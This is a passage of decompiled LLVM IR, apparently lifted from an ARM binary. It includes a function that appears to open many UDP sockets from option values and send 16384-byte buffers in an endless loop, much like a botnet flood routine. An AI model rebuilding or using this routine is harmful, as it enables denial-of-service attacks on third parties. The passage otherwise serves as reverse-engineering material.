  %v4_cddc = add i32 %v3_cddc, 2
  %v5_cddc = inttoptr i32 %v4_cddc to i8*
  store i8 %v1_cdd4, i8* %v5_cddc, align 1
  store i32 %v5_c7ec, i32* %r0.global-to-local, align 4
  %v1_cde4 = load i32, i32* @r4, align 4
  %v9_cde4 = icmp eq i32 %v5_c7ec, %v1_cde4
  store i1 %v9_cde4, i1* %cpsr_z.global-to-local, align 1
  %v0_cde8 = load i32, i32* %r3.global-to-local, align 4
  %v1_cde8 = trunc i32 %v0_cde8 to i8
  %v2_cde8 = load i32, i32* @r6, align 4
  %v3_cde8 = add i32 %v2_cde8, 3
  %v4_cde8 = inttoptr i32 %v3_cde8 to i8*
  store i8 %v1_cde8, i8* %v4_cde8, align 1
  %v0_cdec = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_cdec, label %dec_label_pc_cdf0, label %dec_label_pc_cdd4.dec_label_pc_cc54_crit_edge

dec_label_pc_cdd4.dec_label_pc_cc54_crit_edge:    ; preds = %dec_label_pc_cdd4
  %v1_cc58.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_cc54

dec_label_pc_cdf0:                                ; preds = %dec_label_pc_cdd4, %dec_label_pc_cc48
  %v0_cdf0 = call i32 @function_fe60()
  store i32 %v0_cdf0, i32* %r0.global-to-local, align 4
  store i32 %v6_c804, i32* %r2.global-to-local, align 4
  %v1_cdf8 = load i32, i32* @r4, align 4
  %v9_cdf8 = icmp eq i32 %v6_c804, %v1_cdf8
  store i1 %v9_cdf8, i1* %cpsr_z.global-to-local, align 1
  %v1_cdfc = load i32, i32* @r6, align 4
  %v2_cdfc = add i32 %v1_cdfc, 4
  %v3_cdfc = inttoptr i32 %v2_cdfc to i32*
  store i32 %v0_cdf0, i32* %v3_cdfc, align 4
  br i1 %v9_cdf8, label %dec_label_pc_ce04, label %dec_label_pc_cc60

dec_label_pc_ce04:                                ; preds = %dec_label_pc_cdf0, %dec_label_pc_cc54
  %v0_ce04 = call i32 @function_fe60()
  store i32 %v0_ce04, i32* %r0.global-to-local, align 4
  store i32 %v1_c924, i32* %r3.global-to-local, align 4
  store i1 %v2_ce0c, i1* %cpsr_z.global-to-local, align 1
  %v1_ce10 = load i32, i32* @r6, align 4
  %v2_ce10 = add i32 %v1_ce10, 8
  %v3_ce10 = inttoptr i32 %v2_ce10 to i32*
  store i32 %v0_ce04, i32* %v3_ce10, align 4
  br i1 %v2_ce0c, label %dec_label_pc_cc6c, label %dec_label_pc_ce18

dec_label_pc_ce18:                                ; preds = %dec_label_pc_cc60, %dec_label_pc_ce04
  %v0_ce18 = call i32 @function_fe60()
  %v1_ce18 = trunc i32 %v0_ce18 to i8
  store i32 %v0_ce18, i32* %r0.global-to-local, align 4
  %v4_ce1c = sdiv i32 %v0_ce18, 256
  store i32 %v4_ce1c, i32* %r3.global-to-local, align 4
  %v1_ce20 = trunc i32 %v4_ce1c to i8
  %v2_ce20 = load i32, i32* @r6, align 4
  %v3_ce20 = add i32 %v2_ce20, 19
  %v4_ce20 = inttoptr i32 %v3_ce20 to i8*
  store i8 %v1_ce20, i8* %v4_ce20, align 1
  %v3_ce24 = load i32, i32* @r6, align 4
  %v4_ce24 = add i32 %v3_ce24, 18
  %v5_ce24 = inttoptr i32 %v4_ce24 to i8*
  store i8 %v1_ce18, i8* %v5_ce24, align 1
  br label %dec_label_pc_cc6c

dec_label_pc_ce2c:                                ; preds = %dec_label_pc_c8d4
  %v0_ce2c = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_ce2c, i32* %r0.global-to-local, align 4
  %v1_ce30 = call i32 @function_1369c(i32 %v0_ce2c)
  store i32 %v1_ce30, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ce34

dec_label_pc_ce34:                                ; preds = %dec_label_pc_c6fc, %dec_label_pc_ce2c
  %v29_ce38 = phi i32 [ %v3_c8c4, %dec_label_pc_c6fc ], [ %v1_ce30, %dec_label_pc_ce2c ]
  store i32 %v3_c6fc, i32* %r4.global-to-local, align 4
  store i32 %v12_c6fc, i32* %r7.global-to-local, align 4
  ret i32 %v29_ce38

; uselistorder directives
  uselistorder i32 %v4_ce1c, { 1, 0 }
  uselistorder i32 %v0_ce18, { 0, 2, 1 }
  uselistorder i32 %v0_cdb8, { 0, 2, 1 }
  uselistorder i32 %v0_cd9c, { 0, 2, 1 }
  uselistorder i32 %v2_cd70, { 1, 0 }
  uselistorder i32 %v8_cd50, { 2, 0, 1, 3 }
  uselistorder i32 %v3_cd3c, { 1, 0 }
  uselistorder i32 %v0_cd2c, { 1, 0, 2, 3 }
  uselistorder i1 %v2_cd0c, { 1, 0 }
  uselistorder i32 %v0_cd00, { 1, 2, 3, 0 }
  uselistorder i32 %v1_ccfc, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v4_cca4, { 0, 2, 1 }
  uselistorder i32 %v0_cc8c, { 1, 0, 2 }
  uselistorder i1 %v7_cc14, { 2, 1, 0 }
  uselistorder i1 %v2_ce0c, { 2, 3, 1, 0 }
  uselistorder i1 %v3_cd90, { 1, 0, 2, 3 }
  uselistorder i32 %v1_cbc8, { 1, 0, 2, 3 }
  uselistorder i8 %v5_c9e0, { 1, 0 }
  uselistorder i32 %v1_c9c0, { 1, 0 }
  uselistorder i32 %v1_c9b0, { 1, 0 }
  uselistorder i32 %v1_c9ac, { 1, 0 }
  uselistorder i32 %v1_c9a8, { 1, 0 }
  uselistorder i32 %v3_c998, { 1, 0 }
  uselistorder i32 %v1_c988, { 1, 0 }
  uselistorder i32 %v1_c980, { 1, 0 }
  uselistorder i32 %v1_c95c, { 1, 0 }
  uselistorder i32 %v1_c958, { 1, 0 }
  uselistorder i32 %v1_c950, { 1, 0 }
  uselistorder i32 %v1_c924, { 2, 1, 3, 0 }
  uselistorder i32 %v3_c918, { 0, 1, 3, 2 }
  uselistorder i32 %v0_c914, { 3, 0, 1, 2 }
  uselistorder i32 %v0_c910, { 0, 1, 2, 4, 3 }
  uselistorder i1 %v7_c8f4, { 1, 0 }
  uselistorder i1 %v7_c8c8, { 1, 0 }
  uselistorder i32 %v3_c8c4, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v6_c8b0, { 6, 4, 0, 5, 1, 3, 2 }
  uselistorder i32 %v6_c804, { 3, 2, 1, 0 }
  uselistorder i32 %v5_c7ec, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_c79c, { 1, 0 }
  uselistorder i32 %v5_c734, { 1, 0 }
  uselistorder i32 %v1_c700, { 2, 1, 0 }
  uselistorder i32* %stack_var_-40, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0, 12, 11 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 29, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 30, 31 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 21, 23, 24, 25, 26, 27, 28, 30, 29, 31, 32, 33, 35, 34, 37, 36, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 3, 5, 6, 4, 7, 8, 10, 9, 12, 11, 13, 15, 14, 16, 17, 18, 21, 19, 20, 22, 23, 24, 25, 26, 54, 27, 28, 29, 30, 34, 31, 32, 33, 35, 37, 36, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 0 }
  uselistorder i32 10240, { 0, 6, 2, 7, 5, 8, 3, 9, 4, 10, 1, 11 }
  uselistorder i32 42, { 2, 0, 3, 1, 4 }
  uselistorder label %dec_label_pc_ce34, { 1, 0 }
  uselistorder label %dec_label_pc_ce18, { 1, 0 }
  uselistorder label %dec_label_pc_cc6c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_cbe0, { 1, 0 }
  uselistorder label %bb76, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_ce40(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_ce40:
  %fp.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-80 = alloca i8, align 1
  %v24_ce40 = load i32, i32* @fp, align 4
  %v1_ce44 = urem i32 %arg1, 256
  store i32 %v1_ce44, i32* @r7, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* @r6, align 4
  %v1_ce5c = urem i32 %arg3, 256
  store i32 %v1_ce5c, i32* @r4, align 4
  %v2_ce60 = call i32 @function_14294(i32 %v1_ce44, i32 4)
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %v2_ce60, i32* @sl, align 4
  %v0_ce6c = load i32, i32* @r7, align 4
  %v2_ce70 = call i32 @function_14294(i32 %v0_ce6c, i32 4)
  store i32 65535, i32* @r5, align 4
  %v0_ce7c = load i32, i32* @r6, align 4
  store i32 %v0_ce7c, i32* %r1.global-to-local, align 4
  store i32 %v2_ce70, i32* @sb, align 4
  %v0_ce8c = load i32, i32* @r4, align 4
  %v4_ce90 = inttoptr i32 %v0_ce7c to i32*
  %v5_ce90 = call i32 @function_a4e8(i32 %v0_ce8c, i32* %v4_ce90, i32 7, i32 65535)
  %v3_ce98 = urem i32 %v5_ce90, 65536
  %v0_ce9c = load i32, i32* @r6, align 4
  store i32 %v0_ce9c, i32* %r1.global-to-local, align 4
  %v0_cea4 = load i32, i32* @r5, align 4
  %v0_cea8 = load i32, i32* @r4, align 4
  %v5_ceb0 = inttoptr i32 %v0_ce9c to i32*
  %v6_ceb0 = call i32 @function_a4e8(i32 %v0_cea8, i32* %v5_ceb0, i32 6, i32 %v0_cea4)
  %v0_ceb4 = load i32, i32* @r6, align 4
  store i32 %v0_ceb4, i32* %r1.global-to-local, align 4
  %v3_ceb8 = mul i32 %v6_ceb0, 65536
  store i32 %v3_ceb8, i32* %fp.global-to-local, align 4
  %v0_cec4 = load i32, i32* @r4, align 4
  %v4_cec8 = inttoptr i32 %v0_ceb4 to i32*
  %v5_cec8 = call i32 @function_a4e8(i32 %v0_cec4, i32* %v4_cec8, i32 0, i32 512)
  %v0_ced4 = load i32, i32* @r6, align 4
  store i32 %v0_ced4, i32* %r1.global-to-local, align 4
  %v0_ced8 = load i32, i32* @r4, align 4
  %v3_cee0 = urem i32 %v5_cec8, 65536
  store i32 %v3_cee0, i32* @r6, align 4
  %v4_cee4 = inttoptr i32 %v0_ced4 to i32*
  %v5_cee4 = call i32 @function_a4e8(i32 %v0_ced8, i32* %v4_cee4, i32 1, i32 1)
  %v0_cee8 = load i32, i32* %fp.global-to-local, align 4
  %v3_cee8 = udiv i32 %v0_cee8, 65536
  %v1_cef0 = load i32, i32* @r5, align 4
  %v9_cef0 = icmp eq i32 %v3_cee8, %v1_cef0
  store i32 0, i32* %stack_var_-52, align 4
  br i1 %v9_cef0, label %dec_label_pc_cf18, label %bb

bb:                                               ; preds = %dec_label_pc_ce40
  %v2_cf04 = mul nuw nsw i32 %v3_cee8, 256
  %v4_cf08 = and i32 %v2_cf04, 65280
  %v1_cf0c = urem i32 %v5_cee4, 256
  store i32 %v1_cf0c, i32* @r8, align 4
  %v5_cf10 = udiv i32 %v0_cee8, 16777216
  %v6_cf10 = or i32 %v4_cf08, %v5_cf10
  br label %dec_label_pc_cf24

dec_label_pc_cf18:                                ; preds = %dec_label_pc_ce40
  %v1_cf0c7 = urem i32 %v5_cee4, 256
  store i32 %v1_cf0c7, i32* @r8, align 4
  %v0_cf18 = call i32 @function_fe60()
  %v3_cf20 = urem i32 %v0_cf18, 65536
  br label %dec_label_pc_cf24

dec_label_pc_cf24:                                ; preds = %bb, %dec_label_pc_cf18
  %storemerge17 = phi i32 [ %v6_cf10, %bb ], [ %v3_cf20, %dec_label_pc_cf18 ]
  store i32 %storemerge17, i32* %fp.global-to-local, align 4
  %v0_cf24 = load i32, i32* @r7, align 4
  %tmp41 = icmp slt i32 %v0_cf24, 1
  br i1 %tmp41, label %dec_label_pc_d0cc.preheader, label %dec_label_pc_cf2c

dec_label_pc_d0cc.preheader:                      ; preds = %dec_label_pc_d028, %dec_label_pc_cf24
  %storemerge3.in12.ph = phi i32 [ %v0_cf24, %dec_label_pc_cf24 ], [ %v1_cf80, %dec_label_pc_d028 ]
  %tmp424750 = icmp slt i32 %storemerge3.in12.ph, 1
  br i1 %tmp424750, label %dec_label_pc_d094, label %dec_label_pc_d098.lr.ph

dec_label_pc_cf2c:                                ; preds = %dec_label_pc_cf24
  store i32 %v3_ce98, i32* %r1.global-to-local, align 4
  %v3_cf30 = udiv i32 %v5_ce90, 256
  %v5_cf3c = trunc i32 %v3_cf30 to i8
  store i32 %arg2, i32* @r5, align 4
  %v3_cf54 = udiv i32 %v5_ce90, 65536
  store i32 %v3_cf54, i32* @r4, align 4
  %v4_cf64 = trunc i32 %v3_cf54 to i8
  store i8 %v4_cf64, i8* %stack_var_-80, align 1
  %v3_d074 = icmp eq i32 %v3_ce98, 65535
  %v2_cf9c = ptrtoint i32* %stack_var_-52 to i32
  %v3_cfcc = bitcast i32* %stack_var_-52 to %sockaddr*
  br label %dec_label_pc_d058

dec_label_pc_cf6c:                                ; preds = %dec_label_pc_d058
  %v2_cf6c = load i8, i8* %stack_var_-80, align 1
  %v3_cf6c = sext i8 %v2_cf6c to i32
  store i32 %v3_cf6c, i32* %r1.global-to-local, align 4
  store i32 %v3_cf30, i32* @r4, align 4
  %v2_cf70 = load i32, i32* @r5, align 4
  %v3_cf70 = add i32 %v2_cf70, 2
  %v4_cf70 = inttoptr i32 %v3_cf70 to i8*
  store i8 %v5_cf3c, i8* %v4_cf70, align 1
  %v0_cf74 = load i32, i32* %r1.global-to-local, align 4
  %v1_cf74 = trunc i32 %v0_cf74 to i8
  %v2_cf74 = load i32, i32* @r5, align 4
  %v3_cf74 = add i32 %v2_cf74, 3
  %v4_cf74 = inttoptr i32 %v3_cf74 to i8*
  store i8 %v1_cf74, i8* %v4_cf74, align 1
  br label %dec_label_pc_cf78

dec_label_pc_cf78:                                ; preds = %dec_label_pc_d080, %dec_label_pc_cf6c
  %v1_cf80 = add i32 %stack_var_-56.0, 1
  store i32 2, i32* %r1.global-to-local, align 4
  %v3_cf90 = call i32 @function_13f90(i32 2, i32 2, i32 17)
  store i32 %stack_var_-60.0, i32* @r4, align 4
  %v7_cf98 = icmp eq i32 %v3_cf90, -1
  store i32 %v2_cf9c, i32* %r1.global-to-local, align 4
  store i32 0, i32* @lr, align 4
  %v2_cfac = load i32, i32* @sb, align 4
  %v3_cfac = add i32 %v2_cfac, %stack_var_-60.0
  %v4_cfac = inttoptr i32 %v3_cfac to i32*
  store i32 %v3_cf90, i32* %v4_cfac, align 4
  br i1 %v7_cf98, label %dec_label_pc_d0d8, label %dec_label_pc_cfb4

dec_label_pc_cfb4:                                ; preds = %dec_label_pc_cf78
  store i32 2, i32* %stack_var_-52, align 4
  %v4_cfcc = call i32 @function_13dc0(i32 %v3_cf90, %sockaddr* %v3_cfcc, i32 16)
  %v0_cfd0 = load i32, i32* @r5, align 4
  %v1_cfd0 = add i32 %v0_cfd0, 20
  %v2_cfd0 = inttoptr i32 %v1_cfd0 to i8*
  %v3_cfd0 = load i8, i8* %v2_cfd0, align 1
  %tmp = icmp ugt i8 %v3_cfd0, 31
  br i1 %tmp, label %dec_label_pc_d028, label %dec_label_pc_cfdc

dec_label_pc_cfdc:                                ; preds = %dec_label_pc_cfb4
  %v1_cfdc = add i32 %v0_cfd0, 16
  %v2_cfdc = inttoptr i32 %v1_cfdc to i32*
  %v3_cfdc = load i32, i32* %v2_cfdc, align 4
  store i32 %v3_cfdc, i32* @r4, align 4
  %v0_cfe0 = call i32 @function_fe60()
  %v0_cfe4 = load i32, i32* @r4, align 4
  %v1_cfe8 = and i32 %v0_cfe4, ptrtoint (i32* @global_var_ff00.24 to i32)
  %v1_cfe4 = udiv i32 %v0_cfe4, 256
  %v3_cfec = and i32 %v1_cfe4, 65280
  %v3_cff0 = mul i32 %v0_cfe4, 16777216
  %v4_cff4 = mul i32 %v1_cfe8, 256
  %v5_cff4 = or i32 %v4_cff4, %v3_cff0
  store i32 %v5_cff4, i32* %r1.global-to-local, align 4
  %v4_cff8 = udiv i32 %v0_cfe4, 16777216
  %v5_cff8 = or i32 %v3_cfec, %v4_cff8
  %v0_cffc = load i32, i32* @r5, align 4
  %v1_cffc = add i32 %v0_cffc, 20
  %v2_cffc = inttoptr i32 %v1_cffc to i8*
  %v3_cffc = load i8, i8* %v2_cffc, align 1
  %v4_cffc = zext i8 %v3_cffc to i32
  %v2_d000 = or i32 %v5_cff4, %v5_cff8
  %v7_d004 = lshr i32 %v0_cfe0, %v4_cffc
  %v8_d004 = add i32 %v7_d004, %v2_d000
  %v3_d010 = mul i32 %v8_d004, 16777216
  %v1_d014 = and i32 %v8_d004, 65280
  %v4_d018 = mul nuw nsw i32 %v1_d014, 256
  %v5_d018 = or i32 %v4_d018, %v3_d010
  store i32 %v5_d018, i32* %r1.global-to-local, align 4
  %v2_d020 = call i32 @llvm.bswap.i32(i32 %v8_d004)
  %v2_d024 = add i32 %v0_cffc, 4
  %v3_d024 = inttoptr i32 %v2_d024 to i32*
  store i32 %v2_d020, i32* %v3_d024, align 4
  %v0_d034.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_d028

dec_label_pc_d028:                                ; preds = %dec_label_pc_cfb4, %dec_label_pc_cfdc
  %v0_d034 = phi i32 [ %v0_cfd0, %dec_label_pc_cfb4 ], [ %v0_d034.pre, %dec_label_pc_cfdc ]
  store i32 %stack_var_-60.0, i32* %r1.global-to-local, align 4
  %v1_d030 = load i32, i32* @sb, align 4
  %v2_d030 = add i32 %v1_d030, %stack_var_-60.0
  %v3_d030 = inttoptr i32 %v2_d030 to i32*
  %v4_d030 = load i32, i32* %v3_d030, align 4
  store i32 %v0_d034, i32* %r1.global-to-local, align 4
  %v3_d038 = inttoptr i32 %v0_d034 to %sockaddr*
  %v4_d038 = call i32 @function_13dec(i32 %v4_d030, %sockaddr* %v3_d038, i32 16)
  %v1_d044 = add i32 %stack_var_-60.0, 4
  %v1_d048 = load i32, i32* @r7, align 4
  %v9_d048 = icmp eq i32 %v1_cf80, %v1_d048
  %v0_d050 = load i32, i32* @r5, align 4
  %v1_d050 = add i32 %v0_d050, 24
  store i32 %v1_d050, i32* @r5, align 4
  br i1 %v9_d048, label %dec_label_pc_d0cc.preheader, label %dec_label_pc_d058

dec_label_pc_d058:                                ; preds = %dec_label_pc_d028, %dec_label_pc_cf2c
  %stack_var_-60.0 = phi i32 [ 0, %dec_label_pc_cf2c ], [ %v1_d044, %dec_label_pc_d028 ]
  %stack_var_-56.0 = phi i32 [ 0, %dec_label_pc_cf2c ], [ %v1_cf80, %dec_label_pc_d028 ]
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_d064 = call i32 @function_14294(i32 65535, i32 1)
  store i32 %v3_ce98, i32* %r1.global-to-local, align 4
  %v2_d078 = load i32, i32* @sl, align 4
  %v3_d078 = add i32 %v2_d078, %stack_var_-60.0
  %v4_d078 = inttoptr i32 %v3_d078 to i32*
  store i32 %v2_d064, i32* %v4_d078, align 4
  br i1 %v3_d074, label %dec_label_pc_d080, label %dec_label_pc_cf6c

dec_label_pc_d080:                                ; preds = %dec_label_pc_d058
  %v0_d080 = call i32 @function_fe60()
  %v1_d080 = trunc i32 %v0_d080 to i8
  %v4_d084 = sdiv i32 %v0_d080, 256
  %v1_d088 = trunc i32 %v4_d084 to i8
  %v2_d088 = load i32, i32* @r5, align 4
  %v3_d088 = add i32 %v2_d088, 3
  %v4_d088 = inttoptr i32 %v3_d088 to i8*
  store i8 %v1_d088, i8* %v4_d088, align 1
  %v3_d08c = load i32, i32* @r5, align 4
  %v4_d08c = add i32 %v3_d08c, 2
  %v5_d08c = inttoptr i32 %v4_d08c to i8*
  store i8 %v1_d080, i8* %v5_d08c, align 1
  br label %dec_label_pc_cf78

dec_label_pc_d094:                                ; preds = %dec_label_pc_d0cc.loopexit, %dec_label_pc_d0cc.preheader, %dec_label_pc_d0d0.loopexit, %dec_label_pc_d094
  br label %dec_label_pc_d094

dec_label_pc_d098:                                ; preds = %dec_label_pc_d098.lr.ph, %dec_label_pc_d0d0.loopexit
  %v0_d098 = load i32, i32* @r8, align 4
  %v2_d098 = icmp eq i32 %v0_d098, 0
  store i32 0, i32* @r5, align 4
  br i1 %v2_d098, label %dec_label_pc_d0a0, label %dec_label_pc_d0e0

dec_label_pc_d0a0:                                ; preds = %dec_label_pc_d098
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_d0a8

dec_label_pc_d0a8:                                ; preds = %dec_label_pc_d0a8, %dec_label_pc_d0a0
  %v0_d0b0 = phi i32 [ %v1_d0b0, %dec_label_pc_d0a8 ], [ 0, %dec_label_pc_d0a0 ]
  %v0_d0a8 = phi i32 [ %v1_d0c4, %dec_label_pc_d0a8 ], [ 0, %dec_label_pc_d0a0 ]
  %v1_d0a8 = load i32, i32* @sb, align 4
  %v2_d0a8 = add i32 %v1_d0a8, %v0_d0a8
  %v3_d0a8 = inttoptr i32 %v2_d0a8 to i32*
  %v4_d0a8 = load i32, i32* %v3_d0a8, align 4
  %v1_d0ac = load i32, i32* @sl, align 4
  %v2_d0ac = add i32 %v1_d0ac, %v0_d0a8
  %v3_d0ac = inttoptr i32 %v2_d0ac to i32*
  %v4_d0ac = load i32, i32* %v3_d0ac, align 4
  store i32 %v4_d0ac, i32* %r1.global-to-local, align 4
  %v1_d0b0 = add i32 %v0_d0b0, 1
  %v0_d0b4 = load i32, i32* @r6, align 4
  %v4_d0bc = inttoptr i32 %v4_d0ac to i32*
  %v5_d0bc = call i32 @function_13f00(i32 %v4_d0a8, i32* %v4_d0bc, i32 %v0_d0b4, i32 16384)
  %v1_d0c0 = load i32, i32* @r7, align 4
  %v9_d0c0 = icmp eq i32 %v1_d0b0, %v1_d0c0
  %v0_d0c4 = load i32, i32* @r4, align 4
  %v1_d0c4 = add i32 %v0_d0c4, 4
  store i32 %v1_d0c4, i32* @r4, align 4
  br i1 %v9_d0c0, label %dec_label_pc_d0cc.loopexit, label %dec_label_pc_d0a8

dec_label_pc_d0cc.loopexit:                       ; preds = %dec_label_pc_d0a8
  %tmp4247 = icmp slt i32 %v1_d0b0, 1
  br i1 %tmp4247, label %dec_label_pc_d094, label %dec_label_pc_d098.lr.ph

dec_label_pc_d098.lr.ph:                          ; preds = %dec_label_pc_d0cc.preheader, %dec_label_pc_d0cc.loopexit
  br label %dec_label_pc_d098

dec_label_pc_d0d0.loopexit:                       ; preds = %dec_label_pc_d0e8
  %tmp42 = icmp slt i32 %v0_d110, 1
  br i1 %tmp42, label %dec_label_pc_d094, label %dec_label_pc_d098

dec_label_pc_d0d8:                                ; preds = %dec_label_pc_cf78
  store i32 %v24_ce40, i32* %fp.global-to-local, align 4
  ret i32 %v3_cf90

dec_label_pc_d0e0:                                ; preds = %dec_label_pc_d098
  store i32 0, i32* @fp, align 4
  br label %dec_label_pc_d0e8

dec_label_pc_d0e8:                                ; preds = %dec_label_pc_d0e8, %dec_label_pc_d0e0
  %v0_d0e8 = phi i32 [ %v1_d114, %dec_label_pc_d0e8 ], [ 0, %dec_label_pc_d0e0 ]
  %v1_d0e8 = load i32, i32* @sl, align 4
  %v2_d0e8 = add i32 %v1_d0e8, %v0_d0e8
  %v3_d0e8 = inttoptr i32 %v2_d0e8 to i32*
  %v4_d0e8 = load i32, i32* %v3_d0e8, align 4
  store i32 %v4_d0e8, i32* @r4, align 4
  %v0_d0ec = load i32, i32* @r6, align 4
  store i32 %v0_d0ec, i32* @r1, align 4
  %v1_d0f4 = inttoptr i32 %v4_d0e8 to i8*
  %v2_d0f4 = call i32 @function_1003c(i8* %v1_d0f4)
  %v0_d0f8 = load i32, i32* @r5, align 4
  %v1_d0f8 = add i32 %v0_d0f8, 1
  store i32 %v1_d0f8, i32* @r5, align 4
  %v0_d0fc = load i32, i32* @fp, align 4
  %v1_d0fc = load i32, i32* @sb, align 4
  %v2_d0fc = add i32 %v1_d0fc, %v0_d0fc
  %v3_d0fc = inttoptr i32 %v2_d0fc to i32*
  %v4_d0fc = load i32, i32* %v3_d0fc, align 4
  %v0_d100 = load i32, i32* @r4, align 4
  store i32 %v0_d100, i32* %r1.global-to-local, align 4
  %v0_d104 = load i32, i32* @r6, align 4
  %v4_d10c = inttoptr i32 %v0_d100 to i32*
  %v5_d10c = call i32 @function_13f00(i32 %v4_d0fc, i32* %v4_d10c, i32 %v0_d104, i32 16384)
  %v0_d110 = load i32, i32* @r5, align 4
  %v1_d110 = load i32, i32* @r7, align 4
  %v9_d110 = icmp eq i32 %v0_d110, %v1_d110
  %v0_d114 = load i32, i32* @fp, align 4
  %v1_d114 = add i32 %v0_d114, 4
  store i32 %v1_d114, i32* @fp, align 4
  br i1 %v9_d110, label %dec_label_pc_d0d0.loopexit, label %dec_label_pc_d0e8

; uselistorder directives
  uselistorder i32 %v1_d114, { 1, 0 }
  uselistorder i32 %v0_d110, { 1, 0 }
  uselistorder i32 %v1_d0c4, { 1, 0 }
  uselistorder i32 %v1_d0b0, { 2, 0, 1 }
  uselistorder i32 %stack_var_-60.0, { 0, 5, 2, 4, 1, 3 }
  uselistorder i32 %v0_d034, { 1, 0 }
  uselistorder i32 %v8_d004, { 1, 2, 0 }
  uselistorder i32 %v0_cfe4, { 1, 0, 2, 3 }
  uselistorder i32 %v3_cf90, { 1, 3, 2, 0 }
  uselistorder i32 %v1_cf80, { 1, 2, 0 }
  uselistorder i32 %v3_cf54, { 1, 0 }
  uselistorder i32 %v3_cf30, { 1, 0 }
  uselistorder i32 %v3_ce98, { 0, 2, 1 }
  uselistorder i32 %v1_ce44, { 1, 0 }
  uselistorder i8* %stack_var_-80, { 1, 0 }
  uselistorder i32* %stack_var_-52, { 1, 0, 3, 2 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 11, 12, 3, 4, 5, 6, 7, 8, 9, 10, 13, 14, 16, 15, 17, 19, 18, 0 }
  uselistorder label %dec_label_pc_d098.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_d098, { 1, 0 }
  uselistorder label %dec_label_pc_d094, { 2, 0, 3, 1 }
  uselistorder label %dec_label_pc_d028, { 1, 0 }
  uselistorder label %dec_label_pc_cf24, { 1, 0 }
}

define i32 @function_d124(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_d124:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-40 = alloca i32, align 4
  %v18_d124 = load i32, i32* @sb, align 4
  %v24_d124 = load i32, i32* @fp, align 4
  %v1_d128 = urem i32 %arg1, 256
  store i32 %v1_d128, i32* @sl, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 %v1_d128, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* @r5, align 4
  %v1_d140 = urem i32 %arg3, 256
  store i32 %v1_d140, i32* @r4, align 4
  %v2_d144 = call i32 @function_14294(i32 %v1_d128, i32 4)
  %v0_d148 = load i32, i32* @r5, align 4
  store i32 %v0_d148, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_d158 = load i32, i32* @r4, align 4
  store i32 %v0_d158, i32* %r0.global-to-local, align 4
  %v5_d15c = inttoptr i32 %v0_d148 to i32*
  %v6_d15c = call i32 @function_a4e8(i32 %v0_d158, i32* %v5_d15c, i32 2, i32 0)
  %v1_d168 = urem i32 %v6_d15c, 256
  store i32 %v1_d168, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_d174 = load i32, i32* @r5, align 4
  store i32 %v0_d174, i32* %r1.global-to-local, align 4
  %v0_d178 = load i32, i32* @r4, align 4
  store i32 %v0_d178, i32* %r0.global-to-local, align 4
  %v5_d17c = trunc i32 %v6_d15c to i8
  %v6_d180 = inttoptr i32 %v0_d174 to i32*
  %v7_d180 = call i32 @function_a4e8(i32 %v0_d178, i32* %v6_d180, i32 3, i32 65535)
  %v0_d184 = load i32, i32* @r5, align 4
  store i32 %v0_d184, i32* %r1.global-to-local, align 4
